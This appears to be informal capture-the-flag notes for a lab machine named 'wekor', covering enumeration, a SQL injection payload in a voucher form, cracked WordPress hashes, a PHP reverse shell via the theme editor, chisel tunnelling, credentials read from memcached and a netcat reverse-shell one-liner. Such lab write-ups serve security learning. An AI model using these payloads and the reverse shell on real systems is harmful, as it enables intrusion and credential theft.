# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx wekor.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV wekor.thm
```

we got these open ports
```bash

```

# HTTP (port 80)
robots.txt
```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```


http://wekor.thm/it-next/
http://wekor.thm/it-next/it-cart.php

veulnerability in the add voucher form

' UNION SELECT database(),2,3;#
database() = coupons

table valid_coupons


Coupon Code : 1 With ID : admin And With Expire Date Of : $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. Is Valid!
Coupon Code : 1 With ID : wp_jeffrey And With Expire Date Of : $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
Coupon Code : 1 With ID : wp_yura And With Expire Date Of : $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
Coupon Code : 1 With ID : wp_eagle And With Expire Date Of : $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!




xxxxxx           (wp_eagle)
soccer13         (wp_yura)     
rockyou          (wp_jeffrey)

http://site.wekor.thm/wordpress


admin@wekor.thm


by connecting with wp_yura, we have more permissions and cat edit for example 404 page php file\
we can so add a reverse shell


so now we have a foothold, we can get the creds of the wordpress database : 
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'root123@#59' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

maybe we can try password for an account on the machine (reuse password)


user Orka

/usr/bin/python /root/server.py
/usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1

/etc/ImageMagick-6/mime.xml
/usr/sbin/alsa-info.sh


# In local machine
chisel server -p 9999 --reverse

# In remote machine
# replace 10.0.0.1 with your local ip
chisel client 10.8.72.209:9999 R:8090:127.0.0.1:631


in memcached

stats items
stats cachedump 1 100
get username : Orka
get password : OrkAiSC00L24/7$


we found sudo rights to /home/Orka/Desktop/bitcoin
by doing a strings, we found that the password is password



rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6667 >/tmp/f
/usr/sbin is writable
python path is not absolute
